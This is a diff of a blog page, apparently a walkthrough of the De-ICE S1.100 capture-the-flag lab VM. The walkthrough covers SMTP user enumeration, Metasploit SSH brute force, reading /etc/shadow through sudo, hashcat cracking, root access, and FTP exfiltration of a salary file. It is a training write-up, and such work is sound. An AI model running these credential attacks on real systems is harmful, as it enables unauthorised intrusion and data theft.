@@ -21,7 +21,7 @@
     
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="generator" content="Hugo 0.20.2">
+    <meta name="generator" content="Hugo 0.26">
     <meta name="theme" content="Tranquilpeak 0.3.1-BETA">
     <title>De-ICE S1.100</title>
     <meta name="author" content="Rasta Mouse">
@@ -37,20 +37,12 @@ The CEO of a small company has been pressured by the Board of Directors to have 
 
 The CEO expects you to prove that the admins of the box follow all proper accepted security practices, and that you will not be able to obtain access to the box. Prove to him that a full penetration test of their entire corporation would be the best way to ensure his company is actually following best security practices.
 
-Flags
-
-Encrypted salary file Broken FTP service
-
 ">
     <meta property="og:description" content="Scenario
 
 The CEO of a small company has been pressured by the Board of Directors to have a penetration test done within the company. The CEO, believing his company is secure, feels this is a huge waste of money, especially since he already has a company scan their network for vulnerabilities (using Nessus). To make the BoD happy, he decides to hire you for a 5-day job; and because he really doesn&rsquo;t believe the company is insecure, he has contracted you to look at only one server - an old system that only has a web-based list of the company&rsquo;s contact information.
 
 The CEO expects you to prove that the admins of the box follow all proper accepted security practices, and that you will not be able to obtain access to the box. Prove to him that a full penetration test of their entire corporation would be the best way to ensure his company is actually following best security practices.
-
-Flags
-
-Encrypted salary file Broken FTP service
 
 ">
     <meta property="og:type" content="blog">
@@ -64,10 +56,6 @@ Encrypted salary file Broken FTP service
 The CEO of a small company has been pressured by the Board of Directors to have a penetration test done within the company. The CEO, believing his company is secure, feels this is a huge waste of money, especially since he already has a company scan their network for vulnerabilities (using Nessus). To make the BoD happy, he decides to hire you for a 5-day job; and because he really doesn&rsquo;t believe the company is insecure, he has contracted you to look at only one server - an old system that only has a web-based list of the company&rsquo;s contact information.
 
 The CEO expects you to prove that the admins of the box follow all proper accepted security practices, and that you will not be able to obtain access to the box. Prove to him that a full penetration test of their entire corporation would be the best way to ensure his company is actually following best security practices.
-
-Flags
-
-Encrypted salary file Broken FTP service
 
 ">
     
@@ -83,7 +71,7 @@ Encrypted salary file Broken FTP service
     
 
     
-      <meta property="og:image" content="https://rastamouse.me/images/de-ice_s1-100/icon.png">
+      <meta property="og:image" content="https://rastamouse.me/images/de-ice-s1-100/icon.png">
     
     
     
@@ -307,19 +295,22 @@ ga('send', 'pageview');
           
           <div class="post-content markdown" itemprop="articleBody">
             <div class="main-content-wrap">
-              <h3 id="scenario">Scenario</h3>
+              <h1 id="scenario">Scenario</h1>
 
 <p>The CEO of a small company has been pressured by the Board of Directors to have a penetration test done within the company. The CEO, believing his company is secure, feels this is a huge waste of money, especially since he already has a company scan their network for vulnerabilities (using Nessus). To make the BoD happy, he decides to hire you for a 5-day job; and because he really doesn&rsquo;t believe the company is insecure, he has contracted you to look at only one server - an old system that only has a web-based list of the company&rsquo;s contact information.</p>
 
 <p>The CEO expects you to prove that the admins of the box follow all proper accepted security practices, and that you will not be able to obtain access to the box. Prove to him that a full penetration test of their entire corporation would be the best way to ensure his company is actually following best security practices.</p>
 
-<h3 id="flags">Flags</h3>
-
-<p>Encrypted salary file Broken FTP service</p>
-
 <p></p>
 
-<h2 id="port-scanning-service-enumeration">Port Scanning, Service Enumeration</h2>
+<h2 id="flags">Flags</h2>
+
+<ul>
+<li>Encrypted salary file</li>
+<li>Broken FTP service</li>
+</ul>
+
+<h1 id="port-scanning-service-enumeration">Port Scanning, Service Enumeration</h1>
 
 <p>Start by scanning the host to determine which ports are open and which services are running.</p>
 
@@ -358,7 +349,7 @@ Network Distance: 1 hop
 Service Info: Host: slax.example.net; OS: Unix
 </code></pre>
 
-<p>One possible way to get into this VM is by bruteforcing a valid <code>ssh</code> login - we first determine that password authentication is enabled by attemping to login a few times.</p>
+<p>One possible way to get into this VM is by bruteforcing a valid ssh login - we first determine that password authentication is enabled by attemping to login a few times.</p>
 
 <pre><code class="language-text">╭─root@kali ~/vulnhub/de-ice_s1.100  
 ╰─➤  ssh rasta@192.168.1.100
@@ -372,20 +363,20 @@ Permission denied (publickey,password,keyboard-interactive).
 
 <p>The available authentication methods are printed after the permission denied message.</p>
 
-<h2 id="username-harvesting">Username Harvesting</h2>
+<h1 id="username-harvesting">Username Harvesting</h1>
 
 <p>Open a browser and navigate to <code>http://192.168.1.100</code>, where we find the <code>Information Company Portal</code>.</p>
 
 
 <figure >
     
-        <img src="https://rastamouse.me/images/de-ice_s1-100/company-portal.png" />
+        <img src="https://rastamouse.me/images/de-ice-s1-100/company-portal.png" />
     
     
 </figure>
 
 
-<p>The page contains a list of employee roles, names and email address - information we can use towards bruteforcing <code>ssh</code>.  So let&rsquo;s do that :)</p>
+<p>The page contains a list of employee roles, names and email address - information we can use towards bruteforcing SSH. So let&rsquo;s do that :)</p>
 
 <h2 id="the-wrong-way">The Wrong Way</h2>
 
@@ -421,11 +412,11 @@ coffeec
 ╰─➤  cat employee-list | cut -d '-' -f2 | cut -d '@' -f1 | sed 's/^ //g' &gt; usernames
 </code></pre>
 
-<p>Launch the <code>Metasploit Framework</code>.</p>
+<p>Launch the Metasploit Framework.</p>
 
 <pre><code class="language-text">╭─root@kali ~/vulnhub/de-ice_s1.100  
 ╰─➤  msfconsole -q
-msf &gt; 
+msf &gt;
 </code></pre>
 
 <p>Use the <code>ssh_login</code> module and enter the following options:</p>
@@ -451,15 +442,15 @@ msf auxiliary(ssh_login) &gt; run
 [-] SSH - Failed: 'marym:!likable'
 </code></pre>
 
-<p>Come back in 4 hours to see zero results :( <br/>
+<p>Come back in 4 hours to see zero results :(
 What did we do wrong?</p>
 
 <p>We made two grave assumptions:</p>
 
-<ol>
+<ul>
 <li>That the email address usernames were the same as their system login usernames.</li>
 <li>That all those usernames existed on the system.</li>
-</ol>
+</ul>
 
 <h2 id="the-right-way">The Right Way</h2>
 
@@ -479,7 +470,7 @@ Bob Banter
 Chad Coffee
 
 ╭─root@kali ~/vulnhub/de-ice_s1.100  
-╰─➤  cat employee-list | cut -d '-' -f1 | cut -d ':' -f2 | sed 's/^ //g' &gt; fullnames 
+╰─➤  cat employee-list | cut -d '-' -f1 | cut -d ':' -f2 | sed 's/^ //g' &gt; fullnames
 </code></pre>
 
 <p>Grab this <a href="https://gist.github.com/superkojiman/11076951">Gist</a> by <a href="https://twitter.com/superkojiman">superkojiman</a> (or any other similar tool) to generate lots of different possible usernames.</p>
@@ -503,7 +494,7 @@ mary
 ╰─➤  /opt/namemash.py fullnames &gt; usernames
 </code></pre>
 
-<p>Now we want to actually verify which of these are valid user accounts on the target, which we can do via the <code>smtp</code> service.  <code>smtp-user-enum</code> is a handy script for automating this process, but I always recommend trying manually in the first instance.  Here&rsquo;s why.</p>
+<p>Now we want to actually verify which of these are valid user accounts on the target, which we can do via the <code>smtp</code> service. <code>smtp-user-enum</code> is a handy script for automating this process, but I always recommend trying manually in the first instance. Here&rsquo;s why.</p>
 
 <p>These are the examples provided in the <code>smtp-user-enum</code> script:</p>
 
@@ -550,7 +541,7 @@ smtp-user-enum.pl -M EXPN -D example.com -U users.txt -t 10.0.0.1
 
 <p>We get no meaningful results.</p>
 
-<p>To work out what&rsquo;s going on, connect to the <code>smtp</code> service and run commands manually - that way you can see out the output being returned.</p>
+<p>To work out what&rsquo;s going on, connect to the smtp service and run commands manually - that way you can see out the output being returned.</p>
 
 <pre><code class="language-text">╭─root@kali ~/vulnhub/de-ice_s1.100  
 ╰─➤  ncat 192.168.1.100 25
@@ -593,7 +584,7 @@ RCPT TO: root
 250 2.1.5 root... Recipient ok
 </code></pre>
 
-<p>Now we are getting somewhere.  We&rsquo;ve learned that <code>VRFY</code> and <code>EXPN</code> don&rsquo;t seem to work.  <code>RCPT</code> does work, but only if we specify <code>@slax.exmaple.net</code> as the <code>MAIL FROM</code> address.  Now automate the rest in <code>smtp-user-enum</code>.</p>
+<p>Now we are getting somewhere. We&rsquo;ve learned that <code>VRFY</code> and <code>EXPN</code> don&rsquo;t seem to work. <code>RCPT</code> does work, but only if we specify <code>@slax.exmaple.net</code> as the <code>MAIL FROM</code> address. Now automate the rest in <code>smtp-user-enum</code>.</p>
 
 <pre><code class="language-text">╭─root@kali ~/vulnhub/de-ice_s1.100  
 ╰─➤  smtp-user-enum -M RCPT -U usernames -f rasta@slax.example.net -t 192.168.1.100
@@ -604,7 +595,7 @@ RCPT TO: root
 ######## Scan completed at Sat Jul 15 15:14:44 2017 #########
 </code></pre>
 
-<p>We now know these are the only 3 users on the system (which makes sense against what we know from the portal page) and we see that their usernames are indeed different than their email addresses.  Modify your <code>usernames</code> file so that it only contains these 3.</p>
+<p>We now know these are the only 3 users on the system (which makes sense against what we know from the portal page) and we see that their usernames are indeed different than their email addresses. Modify your usernames file so that it only contains these 3.</p>
 
 <h2 id="ssh">SSH</h2>
 
@@ -673,7 +664,7 @@ bbanter:x:1001:100:,,,:/home/bbanter:/bin/bash
 ccoffee:x:1002:100:,,,:/home/ccoffee:/bin/bash
 </code></pre>
 
-<p>We see that <code>aadams</code> has a <code>uid</code> (User ID) of <code>1000</code> and a <code>gid</code> (Group ID) of <code>10</code>.  <code>bbanter</code> and <code>ccoffee</code> have a <code>gid</code> of <code>100</code>.  By reading <code>/etc/group</code>, we find what these groups are/mean.</p>
+<p>We see that <code>aadams</code> has a <code>uid</code> (User ID) of <code>1000</code> and a <code>gid</code> (Group ID) of <code>10</code>. <code>bbanter</code> and <code>ccoffee</code> have a <code>gid</code> of <code>100</code>. By reading <code>/etc/group</code>, we find what these groups are/mean.</p>
 
 <pre><code class="language-text">bbanter@slax:~$ cat /etc/group 
 root::0:root
@@ -683,9 +674,9 @@ wheel::10:root
 users::100:
 </code></pre>
 
-<p><code>bbanter</code> and <code>ccoffee</code> are just <code>users</code>; <code>aadams</code> is a member of <code>wheel</code>.  The <code>wheel</code> group is used in some Linux system to enable its members to <code>su</code> to <code>root</code>, so it indicates a level of privileged access.  It seems to obtain <code>root</code> access, <code>aadams</code> may be a good target.</p>
+<p><code>bbanter</code> and <code>ccoffee</code> are just users; <code>aadams</code> is a member of <code>wheel</code>. The <code>wheel</code> group is used in some Linux system to enable its members to <code>su</code> to <code>root</code>, so it indicates a level of privileged access. It seems to obtain root access, aadams may be a good target.</p>
 
-<p>We find an <code>ftp</code> folder by looking at the home directories, but we need to be <code>root</code> to access it.</p>
+<p>We find an ftp folder by looking at the home directories, but we need to be root to access it.</p>
 
 <pre><code class="language-text">aadams@slax:~$ ls -l /home/
 total 0
@@ -697,7 +688,7 @@ drwx------ 3 root    root   60 Jun 29  2007 ftp
 
 <h2 id="more-bruteforce">More Bruteforce</h2>
 
-<p>To get access as <code>aadams</code>, we do some more intense <code>ssh</code> bruteforcing.  This one takes significantly longer though.</p>
+<p>To get access as <code>aadams</code>, we do some more intense ssh bruteforcing. This one takes significantly longer though.</p>
 
 <pre><code class="language-text">msf auxiliary(ssh_login) &gt; set BLANK_PASSWORDS false
 msf auxiliary(ssh_login) &gt; set USERNAME aadams
@@ -758,7 +749,7 @@ total 140
 -r-xr-xr-x 1 root root 133056 Jun 29  2007 salary_dec2003.csv.enc
 </code></pre>
 
-<p>There&rsquo;s our encrypted salary information.  From the clue in <code>/etc/password</code>, we can surmise we need the root password to decrypt the file.</p>
+<p>There&rsquo;s our encrypted salary information. From the clue in <code>/etc/password</code>, we can surmise we need the root password to decrypt the file.</p>
 
 <p>Use <code>sudo</code> to read the password hashes from <code>/etc/shadow</code>.</p>
 
@@ -770,15 +761,15 @@ bbanter:$1$hl312g8m$Cf9v9OoRN062STzYiWDTh1:13550:0:99999:7:::
 ccoffee:$1$nsHnABm3$OHraCR9ro.idCMtEiFPPA.:13550:0:99999:7:::
 </code></pre>
 
-<p><code>$1$</code> means this is an <code>md5</code> hash and <code>TOi0HE5n</code> is a salt.  Each hash is using a different salt, which prevents the use of <a href="https://en.wikipedia.org/wiki/Rainbow_table">rainbow table</a> attacks.</p>
+<p><code>$1$</code> means this is an <code>md5</code> hash and <code>TOi0HE5n</code> is a salt. Each hash is using a different salt, which prevents the use of <a href="https://en.wikipedia.org/wiki/Rainbow_table">rainbow table</a> attacks.</p>
 
-<p>Feed these into a password cracker like <code>John the Ripper</code> or <code>hashcat</code>.</p>
+<p>Feed these into a password cracker like John the Ripper or hashcat.</p>
 
-<pre><code class="language-text">hashcat64.exe -a 3 -m 500 C:\Users\rasta\Desktop\de-ice_s1-100_hashes -i ?l?l?l?l?l?l
+<pre><code class="language-text">hashcat64.exe -a 3 -m 500 C:\Users\Rasta\Desktop\de-ice_s1-100_hashes -i ?l?l?l?l?l?l
 $1$TOi0HE5n$j3obHaAlUdMbHQnJ4Y5Dq0:tarot
 </code></pre>
 
-<p>Now switch to <code>root</code>.</p>
+<p>Now switch to root.</p>
 
 <pre><code class="language-text">aadams@slax:~$ su root
 Password: *****
@@ -789,7 +780,7 @@ root
 
 <h2 id="getting-the-flag">Getting the Flag</h2>
 
-<p>Now we can access the encrypted file and have full control over the VM.  The challenge description hinted that it wanted us to fix the broken <code>ftp</code> service and use that to exfiltrate the flag.</p>
+<p>Now we can access the encrypted file and have full control over the VM. The challenge description hinted that it wanted us to fix the broken ftp service and use that to exfiltrate the flag.</p>
 
 <pre><code class="language-text">root@slax:/home/ftp/incoming# head -n 1 salary_dec2003.csv.enc | strings 
 Salted__n
@@ -810,7 +801,7 @@ OpenSSL&gt; version
 OpenSSL 1.1.0e  16 Feb 2017
 </code></pre>
 
-<p>The two are different enough that commands on one won&rsquo;t work on the other.  To keep this walkthrough in keeping with the original solution of the time, we&rsquo;ll decrypt the file on the VM and transfer it to ourselves via FTP (instead of the other way around).</p>
+<p>The two are different enough that commands on one won&rsquo;t work on the other. To keep this walkthrough in keeping with the original solution of the time, we&rsquo;ll decrypt the file on the VM and transfer it to ourselves via FTP (instead of the other way around).</p>
 
 <p>We don&rsquo;t yet know which cipher was used for the encryption - we can print a list of those available.</p>
 
@@ -824,7 +815,7 @@ rc4
 rc4-40
 </code></pre>
 
-<p>In this version of OpenSSL, there are 42.  You can write a script that will run through and try them all, or you can get lucky, try the first one and win ;)</p>
+<p>In this version of OpenSSL, there are 42. You can write a script that will run through and try them all, or you can get lucky, try the first one and win ;)</p>
 
 <pre><code class="language-text">root@slax:/home/ftp/incoming# openssl enc -aes-128-cbc -d -in salary_dec2003.csv.enc -out salary_dec2003.csv
 enter aes-128-cbc decryption password:
@@ -873,9 +864,9 @@ Account Number&quot;
 
 <h2 id="exfiltrate">Exfiltrate</h2>
 
-<p>Modify <code>/etc/vsftp.conf</code> (you will probably need to lookup a <code>vi</code> cheat sheet!). Enable anonymous access by changing <code>anonymous_enable=NO</code> to <code>anonymous_enable=YES</code>; comment out the final line to run <code>vsftp</code> through <code>inetd</code>: <code>listen=YES</code> to <code>#listen=YES</code>.</p>
+<p>Modify <code>/etc/vsftp.conf</code> (you will probably need to lookup a <code>vi</code> cheat sheet!). Enable anonymous access by changing <code>anonymous_enable=NO</code> to <code>anonymous_enable=YES</code>; comment out the final line to run vsftp through inetd: <code>listen=YES</code> to <code>#listen=YES</code>.</p>
 
-<p>Exit <code>vi</code> then run <code>modprobe capability</code>.</p>
+<p>Exit vi then run <code>modprobe capability</code>.</p>
 
 <p>Run <code>nmap</code> again and you should have different results.</p>
 
@@ -892,7 +883,7 @@ PORT   STATE  SERVICE  VERSION
 |_Can't get directory listing: TIMEOUT
 </code></pre>
 
-<p>To get the file, you need to actually login as <code>root</code>.</p>
+<p>To get the file, you need to actually login as root.</p>
 
 <pre><code class="language-text">╭─root@kali ~/vulnhub/de-ice_s1.100  
 ╰─➤  ftp 192.168.1.100
@@ -954,7 +945,7 @@ ftp&gt; bye
       
         <li class="post-action">
           
-            <a class="post-action-btn btn btn--disabled">
+            <a class="post-action-btn btn btn--default tooltip--top" href="https://rastamouse.me/2017/08/automated-red-team-infrastructure-deployment-with-terraform---part-1/" data-tooltip="Automated Red Team Infrastructure Deployment with Terraform - Part 1">
           
             <i class="fa fa-angle-left"></i>
             <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
@@ -1035,7 +1026,7 @@ ftp&gt; bye
       
         <li class="post-action">
           
-            <a class="post-action-btn btn btn--disabled">
+            <a class="post-action-btn btn btn--default tooltip--top" href="https://rastamouse.me/2017/08/automated-red-team-infrastructure-deployment-with-terraform---part-1/" data-tooltip="Automated Red Team Infrastructure Deployment with Terraform - Part 1">
           
             <i class="fa fa-angle-left"></i>
             <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
@@ -1167,6 +1158,29 @@ ftp&gt; bye
           <div class="media">
             
             <div class="media-body">
+              <a class="link-unstyled" href="https://rastamouse.me/2017/08/automated-red-team-infrastructure-deployment-with-terraform---part-1/">
+                <h3 class="media-heading">Automated Red Team Infrastructure Deployment with Terraform - Part 1</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Aug 8, 2017
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><h2 id="introduction">Introduction</h2>
+
+<p>Deploying resiliant Red Team infrastructure can be quite a time consuming process.  This <a href="https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki">wiki</a> maintained by <a href="https://twitter.com/424f424f">Steve Borosh</a> and <a href="https://twitter.com/bluscreenofjeff">Jeff Dimmock</a> is probably the best public resource I&rsquo;ve seen in regards to design considerations and hardening tips.</p>
+
+<p>For someone like myself, who destroys and stands fresh infrastructure up for each engagement, building everything by hand is a long, laborious process.  Anything that can be automated is a good thing.</p>
+
+<p></p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
               <a class="link-unstyled" href="https://rastamouse.me/2017/07/de-ice-s1.100/">
                 <h3 class="media-heading">De-ICE S1.100</h3>
               </a>
@@ -1175,15 +1189,11 @@ ftp&gt; bye
                   Jul 7, 2017
                 </span>
               </span>
-              <div class="media-content hide-xs font-merryweather"><h3 id="scenario">Scenario</h3>
+              <div class="media-content hide-xs font-merryweather"><h1 id="scenario">Scenario</h1>
 
 <p>The CEO of a small company has been pressured by the Board of Directors to have a penetration test done within the company. The CEO, believing his company is secure, feels this is a huge waste of money, especially since he already has a company scan their network for vulnerabilities (using Nessus). To make the BoD happy, he decides to hire you for a 5-day job; and because he really doesn&rsquo;t believe the company is insecure, he has contracted you to look at only one server - an old system that only has a web-based list of the company&rsquo;s contact information.</p>
 
 <p>The CEO expects you to prove that the admins of the box follow all proper accepted security practices, and that you will not be able to obtain access to the box. Prove to him that a full penetration test of their entire corporation would be the best way to ensure his company is actually following best security practices.</p>
-
-<h3 id="flags">Flags</h3>
-
-<p>Encrypted salary file Broken FTP service</p>
 
 <p></p></div>
             </div>
@@ -1298,7 +1308,7 @@ beacon&gt; spawnas cyber-lance\tswift Passw0rd! smb
               </a>
               <span class="media-meta">
                 <span class="media-date text-small">
-                  Jul 7, 2017
+                  Aug 8, 2017
                 </span>
               </span>
               <div class="media-content hide-xs font-merryweather"></div>
@@ -1314,7 +1324,7 @@ beacon&gt; spawnas cyber-lance\tswift Passw0rd! smb
          data-message-zero="no post found"
          data-message-one="1 post found"
          data-message-other="{n} posts found">
-         7 posts found
+         8 posts found
       </p>
     </div>
   </div>
